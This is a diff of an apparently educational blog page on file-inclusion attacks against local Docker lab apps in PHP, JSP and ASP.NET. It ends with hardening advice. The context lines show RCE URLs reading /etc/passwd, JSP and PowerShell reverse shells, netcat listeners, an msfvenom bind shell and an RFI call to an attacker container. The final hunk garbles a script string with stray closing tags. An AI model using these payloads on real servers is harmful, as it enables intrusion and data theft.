@@ -2717,7 +2733,7 @@ So this attack isn’t possible any more since then.</p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/php_payloads_msfvenom.png" alt="PHP payloads msfvenom" width="100%"></p>
 
-<p>msfvenom is part of <a href="https://www.metasploit.com/">metasploit</a> which is itself is integrated in the Linux Distribution <a href="https://www.kali.org/">Kali</a>.</p>
+<p>msfvenom is part of <a href="https://www.metasploit.com/" target="_blank" rel="noopener noreferrer">metasploit</a> which is itself is integrated in the Linux Distribution <a href="https://www.kali.org/" target="_blank" rel="noopener noreferrer">Kali</a>.</p>
 
 <h3 id="faulty-code">
 <a class="anchor" href="#faulty-code" aria-hidden="true"><span class="octicon octicon-link"></span></a>Faulty Code</h3>
@@ -2762,7 +2778,7 @@ So this attack isn’t possible any more since then.</p>
 &lt;/html&gt;
 </code></pre>
 
-<p>The problem here is the part where <code class="highlighter-rouge">include</code> commands are combined with the GET-Parameter.</p>
+<p>The problem here is the part where <code class="language-plaintext highlighter-rouge">include</code> commands are combined with the GET-Parameter.</p>
 
 <p>As a soft developer never let the user or client control what files could be loaded.</p>
 
@@ -2778,7 +2794,7 @@ So this attack isn’t possible any more since then.</p>
   <li>a Button where you can load the introduction to the application.</li>
 </ul>
 
-<p>You can go to it <a href="http://127.0.0.1:8881/webapp/">here http://127.0.0.1:8881/webapp/</a>.</p>
+<p>You can go to it <a href="http://127.0.0.1:8881/webapp/" target="_blank" rel="noopener noreferrer">here http://127.0.0.1:8881/webapp/</a>.</p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/jsp_app_view.png" alt="JSP App View" width="100%"></p>
 
@@ -2788,11 +2804,11 @@ So this attack isn’t possible any more since then.</p>
 <h4 id="help-parameter">
 <a class="anchor" href="#help-parameter" aria-hidden="true"><span class="octicon octicon-link"></span></a>Help Parameter</h4>
 
-<p>If you click on the ‘Show’-Button the url will be <a href="%5Bhttp://127.0.0.1:8881/webapp/?help=introduction">http://127.0.0.1:8881/webapp/?help=introduction</a>. 
-You can see a key-value-pair: <code class="highlighter-rouge">help=introduction</code>.</p>
+<p>If you click on the ‘Show’-Button the url will be <a href="http://127.0.0.1:8881/webapp/?help=introduction" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8881/webapp/?help=introduction</a>. 
+You can see a key-value-pair: <code class="language-plaintext highlighter-rouge">help=introduction</code>.</p>
 
 <p>If you call 
-<a href="http://127.0.0.1:8881/webapp/introduction">http://127.0.0.1:8881/webapp/introduction</a>, 
+<a href="http://127.0.0.1:8881/webapp/introduction" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8881/webapp/introduction</a>, 
 you will see that the included file is also directly accessible.</p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/jsp_app_included_standard_file.png" alt="JSP Included standard file" width="100%"></p>
@@ -2803,14 +2819,14 @@ you will see that the included file is also directly accessible.</p>
 <p>Let’s upload something to verify that.</p>
 
 <ol>
-  <li>Create a file with text e.g. <code class="highlighter-rouge">echo "This is test" &gt; showme</code>
+  <li>Create a file with text e.g. <code class="language-plaintext highlighter-rouge">echo "This is test" &gt; showme</code>
 <img src="/blog/assets/img/payload-tester/lfirfi/jsp_cat_testfile.png" alt="JSP Create test file" width="100%">
 </li>
   <li>Upload the file
 <img src="/blog/assets/img/payload-tester/lfirfi/jsp_upload_testfile.png" alt="JSP Upload test file" width="100%"><br>
 <img src="/blog/assets/img/payload-tester/lfirfi/jsp_upload_testfile2.png" alt="JSP Upload test file 2" width="100%">
 </li>
-  <li>Call it up - <a href="http://127.0.0.1:8881/webapp/showme">http://127.0.0.1:8881/webapp/showme</a>
+  <li>Call it up - <a href="http://127.0.0.1:8881/webapp/showme" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8881/webapp/showme</a>
 <img src="/blog/assets/img/payload-tester/lfirfi/jsp_testfile_verify.png" alt="JSP Test File Verify" width="100%">
 </li>
 </ol>
@@ -2836,7 +2852,7 @@ if(name != null &amp;&amp; name.length() &gt; 0) {
 &lt;/body&gt;
 </code></pre>
 
-<p>Save it as <code class="highlighter-rouge">helloworld.jsp</code>, upload it and call it with param <code class="highlighter-rouge">name</code> <a href="http://127.0.0.1:8881/webapp/helloworld.jsp?name=haxxor">http://127.0.0.1:8881/webapp/helloworld.jsp?name=haxxor</a></p>
+<p>Save it as <code class="language-plaintext highlighter-rouge">helloworld.jsp</code>, upload it and call it with param <code class="language-plaintext highlighter-rouge">name</code> <a href="http://127.0.0.1:8881/webapp/helloworld.jsp?name=haxxor" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8881/webapp/helloworld.jsp?name=haxxor</a></p>
 
 <p>The result should be:</p>
 
@@ -2869,18 +2885,18 @@ if(name != null &amp;&amp; name.length() &gt; 0) {
 
 <p>Here, the param is executed as shell command and the result is rendered into the HTML.</p>
 
-<p>Let’s check this! Upload the code as <code class="highlighter-rouge">runme.jsp</code>:</p>
+<p>Let’s check this! Upload the code as <code class="language-plaintext highlighter-rouge">runme.jsp</code>:</p>
 
-<p><a href="http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls">http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls</a></p>
+<p><a href="http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls</a></p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/jsp_final_rce.png" alt="JSP Final Remote Code Execution" width="100%"></p>
 
 <h4 id="etcpasswd-1">
 <a class="anchor" href="#etcpasswd-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>/etc/passwd</h4>
 
-<p>With Remote Code Execution at hand we can also read sensible data. Let’s have a look at the <code class="highlighter-rouge">/etc/passwd</code>:</p>
+<p>With Remote Code Execution at hand we can also read sensible data. Let’s have a look at the <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p>
 
-<p><a href="http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd">http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd</a></p>
+<p><a href="http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd</a></p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/jsp_etcpasswd.png" alt="JSP Final Remote Code Execution" width="100%"></p>
 
@@ -2902,7 +2918,7 @@ or have the OS at your hands otherwise.</p>
 So if this is the case for you and you have the possibility set an exception for</p>
 <ul>
   <li>the path where you save the code and</li>
-  <li>for the <code class="highlighter-rouge">victim_lfi_server_jsp/webapp</code> directory, where the code will be uploaded onto the victim server.</li>
+  <li>for the <code class="language-plaintext highlighter-rouge">victim_lfi_server_jsp/webapp</code> directory, where the code will be uploaded onto the victim server.</li>
 </ul>
 
 <p>First look what payloads msfvenom has for you:</p>
@@ -2975,16 +2991,16 @@ if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
 %&gt;
 </code></pre>
 
-<p>If you upload the code as <code class="highlighter-rouge">reverseshell.jsp</code>,</p>
+<p>If you upload the code as <code class="language-plaintext highlighter-rouge">reverseshell.jsp</code>,</p>
 <ul>
-  <li>go into the jsp attacker server (using its docker id which you get with <code class="highlighter-rouge">docker ps -a</code> and do a <code class="highlighter-rouge">docker exec -ti &lt;container_id&gt; /bin/bash</code>)</li>
-  <li>set up a netcat listener on port 4444: <code class="highlighter-rouge">nc -nlvp 4444</code>
+  <li>go into the jsp attacker server (using its docker id which you get with <code class="language-plaintext highlighter-rouge">docker ps -a</code> and do a <code class="language-plaintext highlighter-rouge">docker exec -ti &lt;container_id&gt; /bin/bash</code>)</li>
+  <li>set up a netcat listener on port 4444: <code class="language-plaintext highlighter-rouge">nc -nlvp 4444</code>
 </li>
 </ul>
 
 <p>You can now connect to the victim server calling in the browser</p>
 
-<p><a href="http://127.0.0.1:8881/webapp/?help=reverseshell.jsp">http://127.0.0.1:8881/webapp/?help=reverseshell.jsp</a></p>
+<p><a href="http://127.0.0.1:8881/webapp/?help=reverseshell.jsp" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8881/webapp/?help=reverseshell.jsp</a></p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/jsp_reverseshell.png" alt="JSP Reverse Shell" width="100%"></p>
 
@@ -2993,7 +3009,7 @@ if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
 
 <p>The JSP application is also vulnerable to Remote File Inclusion.</p>
 
-<p>Go into the attacker server webapp folder and create a file called <code class="highlighter-rouge">thiscomesfromhaxxor</code>:</p>
+<p>Go into the attacker server webapp folder and create a file called <code class="language-plaintext highlighter-rouge">thiscomesfromhaxxor</code>:</p>
 
 <pre><code class="bash">cd attacker_server_jsp/webapp/
 </code></pre>
@@ -3003,7 +3019,7 @@ if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
 
 <p>Now call in the browser:</p>
 
-<p><a href="http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor">http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor</a></p>
+<p><a href="http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor</a></p>
 
 <p>Result:</p>
 
@@ -3045,13 +3061,13 @@ Select a file to upload: &lt;br&gt;
 &lt;/c:if&gt;
 </code></pre>
 
-<p>The problematic part is the section where <code class="highlighter-rouge">c:import</code> is combined with <code class="highlighter-rouge">request.getParameter</code>.</p>
+<p>The problematic part is the section where <code class="language-plaintext highlighter-rouge">c:import</code> is combined with <code class="language-plaintext highlighter-rouge">request.getParameter</code>.</p>
 
 <h2 id="exercises-1">
 <a class="anchor" href="#exercises-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Exercises</h2>
 
 <blockquote>
-  <p>You want to attack <code class="highlighter-rouge">victim.lfi.php.tld</code>: Try to read the apache2 configuration <code class="highlighter-rouge">/etc/apache2/apache2.conf</code> abusing the <code class="highlighter-rouge">page</code> parameter.</p>
+  <p>You want to attack <code class="language-plaintext highlighter-rouge">victim.lfi.php.tld</code>: Try to read the apache2 configuration <code class="language-plaintext highlighter-rouge">/etc/apache2/apache2.conf</code> abusing the <code class="language-plaintext highlighter-rouge">page</code> parameter.</p>
 </blockquote>
 
 <p>
@@ -3069,7 +3085,7 @@ Select a file to upload: &lt;br&gt;
 The attack would be:
 </p>
       <p class="card-text">
-<a href="http://127.0.0.1:8883/lfi.php?page=/etc/apache2/apache2.conf">http://127.0.0.1:8883/lfi.php?page=/etc/apache2/apache2.conf</a> 
+<a href="http://127.0.0.1:8883/lfi.php?page=/etc/apache2/apache2.conf" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8883/lfi.php?page=/etc/apache2/apache2.conf</a> 
 </p>
       <p class="card-text">
 <br>
@@ -3079,7 +3095,7 @@ The attack would be:
 </div>
 
 <blockquote>
-  <p>You want to attack <code class="highlighter-rouge">victim.lfi.jsp.tld</code>: Execute a bind shell there and connect to the server. How can you reach that?</p>
+  <p>You want to attack <code class="language-plaintext highlighter-rouge">victim.lfi.jsp.tld</code>: Execute a bind shell there and connect to the server. How can you reach that?</p>
 </blockquote>
 
 <p>
@@ -3097,18 +3113,18 @@ The attack would be:
 The attack would be: Create bind shell code. This can be done using metasploit:
 </p>
       <p class="card-text">
-<code class="highlighter-rouge">msfvenom -p java/jsp_shell_bind_tcp</code> 
+<code class="language-plaintext highlighter-rouge">msfvenom -p java/jsp_shell_bind_tcp</code> 
 </p>
       <p class="card-text">
 The generated code contains the port:
-<code class="highlighter-rouge">ServerSocket server_socket = new ServerSocket( 4444 );</code> 
+<code class="language-plaintext highlighter-rouge">ServerSocket server_socket = new ServerSocket( 4444 );</code> 
 The server will listen at port 4444.
 </p>
       <p class="card-text">
-Save the code as <code class="highlighter-rouge">bindshell.jsp</code>. Upload it to <a href="http://127.0.0.1:8881/webapp/">http://127.0.0.1:8881/webapp/</a> and call <a href="http://127.0.0.1:8881/webapp/?help=bindshell.jsp">http://127.0.0.1:8881/webapp/?help=bindshell.jsp</a>. 
+Save the code as <code class="language-plaintext highlighter-rouge">bindshell.jsp</code>. Upload it to <a href="http://127.0.0.1:8881/webapp/" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8881/webapp/</a> and call <a href="http://127.0.0.1:8881/webapp/?help=bindshell.jsp" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8881/webapp/?help=bindshell.jsp</a>. 
 </p>
       <p class="card-text">
-You can now connect to the server: Do a <code class="highlighter-rouge">docker exec -ti &lt;container_id_attacker_server_jsp&gt; /bin/bash</code> and call <code class="highlighter-rouge">nc victim.lfi.jsp.tld 4444</code>.
+You can now connect to the server: Do a <code class="language-plaintext highlighter-rouge">docker exec -ti &lt;container_id_attacker_server_jsp&gt; /bin/bash</code> and call <code class="language-plaintext highlighter-rouge">nc victim.lfi.jsp.tld 4444</code>.
 <img src="/blog/assets/img/payload-tester/lfirfi/jsp_docker_bindshell.png" alt="JSP Docker Bind Shell" width="100%">
 </p>
     </div>
@@ -3123,7 +3139,7 @@ You can now connect to the server: Do a <code class="highlighter-rouge">docker e
 <p>The server infrastructure looks like:</p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/lfirfi_infrastructure_win.svg" alt="LFI / RFI Win Infrastructure" width="100%"></p>
-<p class="foto_creds" style="font-size:0.5em">Created with <a href="https://www.yworks.com/products/yed">yEd</a>. Icon credits to: <a href="https://www.vrt.com.au/downloads/vrt-network-equipment">VRT</a> <a href="https://creativecommons.org/licenses/by-sa/3.0/de/">CC-by-sa-v3</a>, <a href="https://www.iconfinder.com/iconsets/kameleon-free-pack">Kameleon Free Pack</a></p>
+<p class="foto_creds" style="font-size:0.5em">Created with <a href="https://www.yworks.com/products/yed" target="_blank" rel="noopener noreferrer">yEd</a>. Icon credits to: <a href="https://www.vrt.com.au/downloads/vrt-network-equipment" target="_blank" rel="noopener noreferrer">VRT</a> <a href="https://creativecommons.org/licenses/by-sa/3.0/de/" target="_blank" rel="noopener noreferrer">CC-by-sa-v3</a>, <a href="https://www.iconfinder.com/iconsets/kameleon-free-pack" target="_blank" rel="noopener noreferrer">Kameleon Free Pack</a></p>
 
 <h2 id="configuration-on-a-linux-system">
 <a class="anchor" href="#configuration-on-a-linux-system" aria-hidden="true"><span class="octicon octicon-link"></span></a>Configuration on a Linux system</h2>
@@ -3135,11 +3151,11 @@ You can now connect to the server: Do a <code class="highlighter-rouge">docker e
 <p>To start you need:</p>
 
 <ul>
-  <li><a href="https://www.virtualbox.org/">VirtualBox</a></li>
+  <li><a href="https://www.virtualbox.org/" target="_blank" rel="noopener noreferrer">VirtualBox</a></li>
 </ul>
 
-<p>After you have installed VirtualBox you can use <a href="https://github.com/StefanScherer/windows-docker-machine">https://github.com/StefanScherer/windows-docker-machine</a>.
-This is a <a href="https://www.vagrantup.com/">vagrant</a> environment using VirtualBox to let you command windows docker from a Linux system.</p>
+<p>After you have installed VirtualBox you can use <a href="https://github.com/StefanScherer/windows-docker-machine" target="_blank" rel="noopener noreferrer">https://github.com/StefanScherer/windows-docker-machine</a>.
+This is a <a href="https://www.vagrantup.com/" target="_blank" rel="noopener noreferrer">vagrant</a> environment using VirtualBox to let you command windows docker from a Linux system.</p>
 
 <p>To install and run it, do:</p>
 
@@ -3164,7 +3180,7 @@ vagrant provision
 
 <pre><code class="bash">vagrant suspend</code></pre>
 
-<p>If you have started it and everything worked fine, you should see a new docker-machine <code class="highlighter-rouge">2016</code>:</p>
+<p>If you have started it and everything worked fine, you should see a new docker-machine <code class="language-plaintext highlighter-rouge">2016</code>:</p>
 
 <pre><code class="bash">docker-machine ls</code></pre>
 
@@ -3233,19 +3249,19 @@ on your computer:</p>
 <h5 id="sanity-check-lfi-2">
 <a class="anchor" href="#sanity-check-lfi-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Sanity check lfi</h5>
 
-<p>Create a file <code class="highlighter-rouge">SimpleEchoPayload.cshtml</code>:</p>
+<p>Create a file <code class="language-plaintext highlighter-rouge">SimpleEchoPayload.cshtml</code>:</p>
 
 <pre><code class="bash">echo "Hi" &gt; SimpleEchoPayload.cshtml
 </code></pre>
 
 <p>and upload it.</p>
 
-<p>In this application there is a param <code class="highlighter-rouge">test</code> which is vulnerable. You have to give the file the <code class="highlighter-rouge">.cshtml</code> extension,
+<p>In this application there is a param <code class="language-plaintext highlighter-rouge">test</code> which is vulnerable. You have to give the file the <code class="language-plaintext highlighter-rouge">.cshtml</code> extension,
 otherwise you will get an error like the following:</p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/asp_error_nocshtml.png" alt="ASP Error No CSHTML" width="100%"></p>
 
-<p>After you have uploaded <code class="highlighter-rouge">SimpleEchoPayload.cshtml</code> you can verify the Local File Inclusion:</p>
+<p>After you have uploaded <code class="language-plaintext highlighter-rouge">SimpleEchoPayload.cshtml</code> you can verify the Local File Inclusion:</p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/asp_lfi_sanity_check.png" alt="ASP LFI Sanity Check" width="100%"></p>
 
@@ -3388,9 +3404,9 @@ Arguments = "/c dir",
 <h6 id="remote-code-execution">
 <a class="anchor" href="#remote-code-execution" aria-hidden="true"><span class="octicon octicon-link"></span></a>Remote code execution</h6>
 
-<p>Now we use <code class="highlighter-rouge">Arguments</code> to run a Powershell Command to setup a reverse shell.</p>
+<p>Now we use <code class="language-plaintext highlighter-rouge">Arguments</code> to run a Powershell Command to setup a reverse shell.</p>
 
-<p>First we go into our attacker machine. Therefore we have to get the <code class="highlighter-rouge">docker id</code> using</p>
+<p>First we go into our attacker machine. Therefore we have to get the <code class="language-plaintext highlighter-rouge">docker id</code> using</p>
 
 <pre><code class="bash">docker ps -a</code></pre>
 
@@ -3406,7 +3422,7 @@ Arguments = "/c dir",
 
 <pre><code class="DOS.bat">nc -nlvp 4444</code></pre>
 
-<p>and create a file in which we include our attacker ip in the reverse shell code (this code was used from <a href="http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html">Week of PowerShell Shells - Announcement and Day 1</a>)</p>
+<p>and create a file in which we include our attacker ip in the reverse shell code (this code was used from <a href="http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html" target="_blank" rel="noopener noreferrer">Week of PowerShell Shells - Announcement and Day 1</a>)</p>
 
 <pre><code class="DOS.bat">RevShell.cshtml</code></pre>
 
@@ -3437,7 +3453,7 @@ Arguments = "/c dir",
 @Html.Raw(@ViewData["Cmdout"])
 </code></pre>
 
-<p>If we upload this file, and call <code class="highlighter-rouge">http://&lt;ip-docker-container&gt;:8080/?test=RevShell.cshtml</code> we get a reverse shell:</p>
+<p>If we upload this file, and call <code class="language-plaintext highlighter-rouge">http://&lt;ip-docker-container&gt;:8080/?test=RevShell.cshtml</code> we get a reverse shell:</p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/asp_reverseshell.png" alt="ASP Powershell reverse shell" width="100%"></p>
 
@@ -3519,7 +3535,7 @@ namespace Test.Pages
 <h2 id="blackbox-testing">
 <a class="anchor" href="#blackbox-testing" aria-hidden="true"><span class="octicon octicon-link"></span></a>Blackbox-Testing</h2>
 
-<p>To find at least the lfi vulnerabilities which allow file path traversal you can use <a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">OWASP ZAP</a></p>
+<p>To find at least the lfi vulnerabilities which allow file path traversal you can use <a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project" target="_blank" rel="noopener noreferrer">OWASP ZAP</a></p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/owaspzap2.png" alt="OWASP ZAP 2" width="100%">
 <img src="/blog/assets/img/payload-tester/lfirfi/owaspzap1.png" alt="OWASP ZAP 1" width="100%"></p>
@@ -3537,7 +3553,7 @@ b) the user can determine the names of the files himself at the same time</p>
 <p>Try to harden the server settings from the beginning and only open them when needed.
 Keyword here [Secure by Default] (https://en.wikipedia.org/wiki/Secure_by_default).</p>
 
-<p>In PHP for example let <code class="highlighter-rouge">allow_url_fopen</code> and <code class="highlighter-rouge">allow_url_include</code> set to <code class="highlighter-rouge">Off</code> in <code class="highlighter-rouge">php.ini</code> configuration file.</p>
+<p>In PHP for example let <code class="language-plaintext highlighter-rouge">allow_url_fopen</code> and <code class="language-plaintext highlighter-rouge">allow_url_include</code> set to <code class="language-plaintext highlighter-rouge">Off</code> in <code class="language-plaintext highlighter-rouge">php.ini</code> configuration file.</p>
 
 <h2 id="for-developers">
 <a class="anchor" href="#for-developers" aria-hidden="true"><span class="octicon octicon-link"></span></a>For developers</h2>
@@ -3562,19 +3578,19 @@ Never try to soften that. Do not allow client control what files to load.</p>
 <p>A description how to test can be found at OWASP:</p>
 
 <ul>
-  <li><a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion">https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion</a></li>
+  <li><a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion" target="_blank" rel="noopener noreferrer">https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion</a></li>
 </ul>
 
 <p>A good introduction in the realm of PHP:</p>
 
 <ul>
-  <li><a href="https://github.com/it-security-kassel-nordhessen/meetup/blob/master/2019_01_16_33rd/web_security_basics/File_Inclusion_Attacks_208_EN.pdf">https://github.com/it-security-kassel-nordhessen/meetup/blob/master/2019_01_16_33rd/web_security_basics/File_Inclusion_Attacks_208_EN.pdf</a></li>
+  <li><a href="https://github.com/it-security-kassel-nordhessen/meetup/blob/master/2019_01_16_33rd/web_security_basics/File_Inclusion_Attacks_208_EN.pdf" target="_blank" rel="noopener noreferrer">https://github.com/it-security-kassel-nordhessen/meetup/blob/master/2019_01_16_33rd/web_security_basics/File_Inclusion_Attacks_208_EN.pdf</a></li>
 </ul>
 
 <p>As well as, for those who understand German:</p>
 
 <ul>
-  <li><a href="https://github.com/it-security-kassel-nordhessen/meetup/blob/master/2019_01_16_33rd/web_security_basics/File_Inclusion_Attacken_DE_2007.pdf">https://github.com/it-security-kassel-nordhessen/meetup/blob/master/2019_01_16_33rd/web_security_basics/File_Inclusion_Attacken_DE_2007.pdf</a></li>
+  <li><a href="https://github.com/it-security-kassel-nordhessen/meetup/blob/master/2019_01_16_33rd/web_security_basics/File_Inclusion_Attacken_DE_2007.pdf" target="_blank" rel="noopener noreferrer">https://github.com/it-security-kassel-nordhessen/meetup/blob/master/2019_01_16_33rd/web_security_basics/File_Inclusion_Attacken_DE_2007.pdf</a></li>
 </ul>
 
 <script>
@@ -3602,7 +3618,10 @@ Never try to soften that. Do not allow client control what files to load.</p>
 						break;
 				case 3:
 						$('#play1cut2text').attr("x","190");
-						$('#play1cut2text').text("<html><head></head><body></body></html>");
+						$('#play1cut2text').text("<html><head></head><body></script>
+</div>
+</div>
+</div></article></body></html>");
 						tl.from('#play1cut2text', 1, {scaleY: 0, transformOrigin: "bottom", ease: Bounce.easeOut});
 						break;
 				 case 4:
